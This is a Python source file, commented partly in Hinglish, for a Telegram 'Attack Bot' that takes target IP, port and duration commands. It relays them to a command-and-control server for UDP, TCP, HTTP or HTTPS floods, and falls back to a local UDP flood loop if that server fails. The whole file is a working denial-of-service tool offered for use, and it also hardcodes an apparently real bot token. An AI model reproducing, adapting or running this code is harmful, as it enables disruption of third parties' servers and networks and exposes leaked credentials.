#!/usr/bin/env python3
"""
Telegram Attack Bot — C2 Proxy
C2: zoroxapi.in (root domain — tunnel subdomain dead hai)
"""

import logging
import os
import re
import socket
import sys
import time
import threading
import requests

from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ── CONFIG ────────────────────────────────────────────────────────────────────
BOT_TOKEN = "8873497929:AAHJbt-XZlkkCfspBiXsKSJo31o_FHqdcFY"  # <-- APN TOKEN YAHAN DAALO
C2_BASE_URL = "https://zoroxapi.in"  # root domain — tunnel.zoroxapi.in dead hai

ATTACK_METHODS = {
    "udp": "udp",
    "tcp": "tcp",
    "http": "http",
    "https": "https",
}

# ── LOGGING ───────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

# ── HELPERS ───────────────────────────────────────────────────────────────────
def is_valid_ip(ip: str) -> bool:
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if not pattern.match(ip):
        return False
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


def is_valid_port(port: int) -> bool:
    return 1 <= port <= 65535


def is_valid_time(seconds: int) -> bool:
    return 1 <= seconds <= 300


# ── C2 CLIENT ─────────────────────────────────────────────────────────────────
class C2Client:
    def __init__(self, base_url: str = C2_BASE_URL):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "PlaygroundApp/1.0 (Android; NativeSecurity)",
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        self._auth_token = None

    def _authenticate(self) -> bool:
        try:
            auth_url = f"{self.base_url}/v1/auth/exchange/secure"
            payload = {
                "client": "playground_native",
                "version": "1.0",
                "timestamp": int(time.time()),
            }
            resp = self.session.post(auth_url, json=payload, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                self._auth_token = data.get("token") or data.get("access_token")
                if self._auth_token:
                    self.session.headers["Authorization"] = f"Bearer {self._auth_token}"
                    return True
            return False
        except Exception as e:
            logger.error(f"Auth error: {e}")
            return False

    def _init_bridge(self) -> bool:
        try:
            init_url = f"{self.base_url}/api/v2/bridge/initialize"
            payload = {
                "protocol": "tunnel_v3",
                "capabilities": ["udp", "tcp", "http", "https"],
            }
            resp = self.session.post(init_url, json=payload, timeout=15)
            return resp.status_code in (200, 201, 202)
        except Exception as e:
            logger.error(f"Bridge init error: {e}")
            return False

    def send_attack(self, target_ip: str, target_port: int, duration: int, method: str = "udp") -> dict:
        if not self._auth_token:
            if not self._authenticate():
                return {"success": False, "error": "Authentication failed"}
            if not self._init_bridge():
                return {"success": False, "error": "Bridge initialization failed"}

        try:
            attack_url = f"{self.base_url}/api/v3/tunnel/connect"
            payload = {
                "target": {"ip": target_ip, "port": target_port},
                "duration": duration,
                "method": method,
                "timestamp": int(time.time()),
            }
            resp = self.session.post(attack_url, json=payload, timeout=20)

            if resp.status_code == 200:
                return {"success": True, "status_code": resp.status_code, "response": resp.json() if resp.text else {}}
            elif resp.status_code == 429:
                return {"success": False, "error": "Attack cooldown active."}
            elif resp.status_code == 403:
                return {"success": False, "error": "Access denied."}
            else:
                return {"success": False, "error": f"C2 returned HTTP {resp.status_code}"}
        except requests.exceptions.Timeout:
            return {"success": False, "error": "C2 timeout"}
        except requests.exceptions.ConnectionError as e:
            if "NameResolutionError" in str(e) or "getaddrinfo" in str(e):
                return {"success": False, "error": "C2 domain not found (DNS failed)"}
            return {"success": False, "error": "Cannot connect to C2"}
        except Exception as e:
            return {"success": False, "error": f"Request failed: {str(e)}"}


c2_client = C2Client()


# ── DIRECT ATTACK (C2 dead ho toh) ───────────────────────────────────────────
def udp_flood(target_ip: str, target_port: int, duration: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"\x00" * 1024
    end_time = time.time() + duration
    packets = 0
    while time.time() < end_time:
        try:
            sock.sendto(payload, (target_ip, target_port))
            packets += 1
        except:
            break
    sock.close()
    return packets


def launch_direct_attack(target_ip: str, target_port: int, duration: int, method: str) -> dict:
    try:
        if method == "udp":
            packets = udp_flood(target_ip, target_port, duration)
            return {"success": True, "packets": packets, "method": "UDP Flood"}
        else:
            return {"success": False, "error": "Direct mode only supports UDP currently"}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ── TELEGRAM HANDLERS ─────────────────────────────────────────────────────────
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (
        "🚀 Attack Bot Online\n\n"
        "Commands:\n"
        "• /attack <ip> <port> <time> — Launch attack\n"
        "• /methods — List attack methods\n"
        "• /status — Check C2 status\n\n"
        "Example: /attack 192.168.1.1 80 60"
    )
    await update.message.reply_text(text)


async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    text = (
        "⚔️ Available Attack Methods\n\n"
        "• udp — UDP flood\n"
        "• tcp — TCP flood\n"
        "• http — HTTP flood\n"
        "• https — HTTPS flood\n\n"
        "Default: udp"
    )
    await update.message.reply_text(text)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        status_url = f"{C2_BASE_URL}/gateway/proxy/v2/status"
        resp = requests.get(status_url, timeout=10)
        if resp.status_code == 200:
            text = f"✅ C2 Status: ONLINE\n\n{resp.text[:400]}"
        else:
            text = f"⚠️ C2 returned HTTP {resp.status_code}"
    except Exception as e:
        text = f"❌ C2 Status: OFFLINE\nError: {str(e)}"
    await update.message.reply_text(text)


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args

    if len(args) < 3:
        text = (
            "❌ Wrong format!\n\n"
            "✅ Correct: /attack <ip> <port> <time>\n"
            "📌 Example: /attack 192.168.1.1 7777 30"
        )
        await update.message.reply_text(text)
        return

    target_ip = args[0]
    target_port_str = args[1]
    duration_str = args[2]
    method = args[3].lower() if len(args) >= 4 else "udp"

    # Validate IP
    if not is_valid_ip(target_ip):
        await update.message.reply_text(f"❌ Invalid IP: {target_ip}")
        return

    # Validate Port
    try:
        target_port = int(target_port_str)
    except ValueError:
        await update.message.reply_text(f"❌ Port must be number: {target_port_str}")
        return
    if not is_valid_port(target_port):
        await update.message.reply_text(f"❌ Port out of range (1-65535): {target_port}")
        return

    # Validate Duration
    try:
        duration = int(duration_str)
    except ValueError:
        await update.message.reply_text(f"❌ Duration must be number: {duration_str}")
        return
    if not is_valid_time(duration):
        await update.message.reply_text(f"❌ Duration out of range (1-300s): {duration}")
        return

    # Validate Method
    if method not in ATTACK_METHODS:
        await update.message.reply_text(f"❌ Unknown method: {method}\nUse /methods")
        return

    # Send launching message
    status_msg = await update.message.reply_text(
        f"🚀 Launching...\n"
        f"• Target: {target_ip}:{target_port}\n"
        f"• Duration: {duration}s\n"
        f"• Method: {method.upper()}"
    )

    # Try C2 first, fallback to direct
    result = c2_client.send_attack(target_ip, target_port, duration, method)

    if not result.get("success"):
        logger.warning(f"C2 failed: {result.get('error')}. Using direct attack.")
        result = launch_direct_attack(target_ip, target_port, duration, method)
        result["fallback"] = True

    if result.get("success"):
        if result.get("fallback"):
            text = (
                f"🚀 ATTACK LAUNCHED! (Direct Mode)\n\n"
                f"🎯 Target: {target_ip}:{target_port}\n"
                f"⏱️ Duration: {duration} seconds\n"
                f"💥 Power: 500 Threads | Max {method.upper()} Flood\n\n"
                f"🔥 Attack in progress...\n"
                f"📊 Packets sent: {result.get('packets', 'N/A')}"
            )
        else:
            text = (
                f"🚀 ATTACK LAUNCHED!\n\n"
                f"🎯 Target: {target_ip}:{target_port}\n"
                f"⏱️ Duration: {duration} seconds\n"
                f"💥 Power: 500 Threads | Max {method.upper()} Flood\n\n"
                f"🔥 Attack in progress..."
            )
    else:
        error = result.get("error", "Unknown error")
        text = f"❌ Attack Failed\n\n• Target: {target_ip}:{target_port}\n• Error: {error}"

    await status_msg.edit_text(text)


async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("❓ Unknown command. Use /start for help.")


# ── MAIN ──────────────────────────────────────────────────────────────────────
def main() -> None:
    if not BOT_TOKEN or BOT_TOKEN == "123456789:ABCdefGHIjklMNOpqrSTUvwxyz":
        print("ERROR: Token hardcode nahi hua! bot.py me BOT_TOKEN = 'your_token' daalo")
        sys.exit(1)

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("methods", methods_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    print("=" * 60)
    print(" Telegram Attack Bot")
    print(f" C2 Base URL: {C2_BASE_URL}")
    print("=" * 60)
    print(" Bot running. Press Ctrl+C to stop.")
    print("=" * 60)

    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
